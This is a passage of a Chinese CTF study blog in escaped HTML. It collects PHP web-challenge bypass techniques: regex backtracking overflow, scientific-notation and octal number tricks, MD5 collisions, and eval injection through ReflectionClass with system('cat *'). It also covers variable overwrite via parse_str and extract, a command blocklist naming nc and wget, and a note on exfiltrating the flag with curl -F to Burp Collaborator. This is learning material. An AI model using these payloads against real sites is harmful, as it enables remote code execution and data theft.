&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;preg_match&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;/.+?ctfshow/is&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$f&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;bye!&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;url=&lt;span class=&#34;string&#34;&gt;&amp;quot;http://10f96bfc-6286-486a-9dd8-aff309362a7b.challenge.ctf.show&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;very&amp;#x27;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;250000&lt;/span&gt; + &lt;span class=&#34;string&#34;&gt;&amp;#x27;36Dctfshow&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;data = &lt;span class=&#34;built_in&#34;&gt;dict&lt;/span&gt;(f=&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ret = requests.post(url, data=data).text&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(ret)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;details&gt;
    &lt;summary&gt;遇到的坑&lt;/summary&gt;
    &lt;p&gt;要将http改为https&lt;/p&gt;
&lt;/details&gt;
&lt;h2 id=&#34;&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#&#34;&gt;#&lt;/a&gt; ==&lt;/h2&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$num&lt;/span&gt;==&lt;span class=&#34;number&#34;&gt;4476&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;no no no!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;用 &lt;code&gt;4476e123&lt;/code&gt;  可绕过。这里 &lt;code&gt;e123&lt;/code&gt;  被当做科学计数法&lt;/p&gt;
&lt;p&gt;如果限制了字母：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;preg_match&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;/[a-z]/i&amp;quot;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$num&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;no no no!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以用小数绕过： &lt;code&gt;4476.1&lt;/code&gt;   &lt;code&gt;+4476.1&lt;/code&gt;  八进制： &lt;code&gt;010574 &lt;/code&gt;   &lt;code&gt;%20010574&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;mark&gt;highlight_file($_GET[‘u’])&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;参数 u 限制了不能等于 flag.php, 可用./flag.php&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;md5碰撞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#md5碰撞&#34;&gt;#&lt;/a&gt; md5 碰撞&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;mark&gt;强比较&lt;/mark&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;数组绕过： &lt;code&gt;a[]=1&amp;amp;b[]=2&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;不同明文相同 MD5 值&lt;br&gt;
 a=%4d% c9%68% ff%0e% e3%5c%20%95%72% d4%77%7b%72%15%87% d3%6f% a7% b2%1b% dc%56% b7%4a%3d% c0%78%3e%7b%95%18% af% bf% a2%00% a8%28%4b% f3%6e%8e%4b%55% b3%5f%42%75%93% d8%49%67%6d% a0% d1%55%5d%83%60% fb%5f%07% fe% a2&amp;amp;b=%4d% c9%68% ff%0e% e3%5c%20%95%72% d4%77%7b%72%15%87% d3%6f% a7% b2%1b% dc%56% b7%4a%3d% c0%78%3e%7b%95%18% af% bf% a2%02% a8%28%4b% f3%6e%8e%4b%55% b3%5f%42%75%93% d8%49%67%6d% a0% d1% d5%5d%83%60% fb%5f%07% fe% a2&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;获得类的信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#获得类的信息&#34;&gt;#&lt;/a&gt; 获得类的信息&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;mark&gt;var_dump&lt;/mark&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;var_dump 能输出变量的信息，也可以输出类的信息&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202411011341443.png&#34; alt=&#34;image-20241101134132415&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;span alt=&#34;dotted&#34;&gt;“=” 赋值的优先级高于 and&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;eval 执行 php 代码，payload: &lt;code&gt;?v1=1&amp;amp;v2=var_dump($ctfshow)/*&amp;amp;v3=*/;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;中间无效的字符串通过构造注释符号注释掉&lt;/p&gt;
&lt;h3 id=&#34;php内置类&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php内置类&#34;&gt;#&lt;/a&gt; php 内置类&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;mark&gt;ReflectionClass&lt;/mark&gt; 建立反射类&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;反射类即类的映射&lt;/p&gt;
&lt;p&gt;$class = new ReflectionClass (‘ctfshow’);   建立 ctfshow 这个类的反射类&lt;/p&gt;
&lt;p&gt;&lt;code&gt;?v1=1&amp;amp;v2=echo new ReflectionClass&amp;amp;v3=;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;不仅可以&lt;strong&gt;映射类&lt;/strong&gt;，也可以&lt;strong&gt;映射方法&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;注意：&lt;span alt=&#34;wavy&#34;&gt;中间的方法不需要加分号&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;title function_ invoke__&#34;&gt;error_reporting&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;ReflectionClass&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;system&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;ls&amp;#x27;&lt;/span&gt;)());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;?v1=ReflectionClass&amp;amp;v2=system(&#39;cat *&#39;)&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;类似还可以用:&lt;/p&gt;
&lt;p&gt;?v1= CachingIterator&amp;amp;v2=system(ls)&lt;br&gt;
?v1= DirectoryIterator&amp;amp;v2=system(ls)&lt;br&gt;
?v1= Error&amp;amp;v2=system(ls)&lt;br&gt;
?v1= Exception&amp;amp;v2=system(ls)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;如果过滤了特殊符号&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;mark&gt;FilesystemIterator()&lt;/mark&gt;: 获取指定目录下的所有文件&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;getcwd()&lt;/mark&gt;: 获取当前路径&lt;/p&gt;
&lt;p&gt;&lt;code&gt; ?v1=FilesystemIterator&amp;amp;v2=getcwd&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;变量覆盖&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#变量覆盖&#34;&gt;#&lt;/a&gt; 变量覆盖&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;mark&gt;parse_str(&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;v&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;v1,&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8389em;vertical-align:-0.1944em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;v&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;v2)&lt;/mark&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;查询字符串解析到变量中&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$v1&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;flag=111&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;parse_str&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$v1&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$v2&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$v2&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;flag&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;         &lt;span class=&#34;comment&#34;&gt;//输出111&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;&lt;mark&gt;$_SERVER[‘argv’]&lt;/mark&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;服务器查询字符串&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;?$fl0g=flag_give_me;&lt;/p&gt;
&lt;p&gt;fun=eval($a[0])&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;相当于：eval ($fl0g=flag_give_me;);&lt;strong&gt; 注意里面是一个变量赋值语句，要加分号&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;或者使用 &lt;code&gt;parse_str&lt;/code&gt;  解析变量&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;?a=1+fl0g=flag_give_me        post:fun=parse_str($a[1])&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;使用 assert 执行字符串中的 PHP 代码，不用加分号&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;?&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;v&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;fl0g=flag_give_me           fun=assert(&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8889em;vertical-align:-0.1944em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.9805em;vertical-align:-0.2861em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.1514em;&#34;&gt;&lt;span style=&#34;top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.2861em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;v&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.1514em;&#34;&gt;&lt;span style=&#34;top:-2.55em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34;&gt;m&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;sser&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;a[0])&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;全局变量&lt;br&gt;
如果有 &amp;amp;&lt;br&gt;
 函数内部无法调用外部的变量&lt;br&gt;
 &lt;code&gt;v2=GLOBALS&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;eval与substr&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#eval与substr&#34;&gt;#&lt;/a&gt; eval () 与 substr ()&lt;/h3&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$F&lt;/span&gt; = @&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;F&amp;#x27;&lt;/span&gt;])&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!&lt;span class=&#34;title function_ invoke__&#34;&gt;preg_match&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;/system|nc|wget|exec|passthru|netcat/i&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$F&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;substr&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$F&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;6个字母都还不够呀?!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;blockquote&gt;
&lt;p&gt;payload:?F=`$F`;+sleep(3)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;curl-f&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#curl-f&#34;&gt;#&lt;/a&gt; curl -F&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;curl -F 将 flag 文件上传到 Burp 的 Collaborator Client&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;php变量过滤&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php变量过滤&#34;&gt;#&lt;/a&gt; php 变量过滤&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;被 get 或者 post 传入的变量名，如果含有空格、+、[则会被转化为_。如果传入 [，它被转化为_之后，后面的字符就会被保留&lt;br&gt;
绕过：变量名如果有下划线可以 &lt;code&gt;替换为[,%20,空格&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;&lt;mark&gt;extract()&lt;/mark&gt;&lt;br&gt;
 使用数组键名作为变量名，使用数组键值作为变量值&lt;br&gt;
 &lt;code&gt;extract($_POST)&lt;/code&gt;  可以将 post 的参数转化为变量&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;?_POST[key1]=36d&amp;amp;_POST[key2]=36d&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;如果有 &lt;code&gt;@parse_str($_SERVER[&#39;QUERY_STRING&#39;]); &lt;/code&gt; 就能转化为：&lt;br&gt;
$_POST[key1]=36d&lt;br&gt;
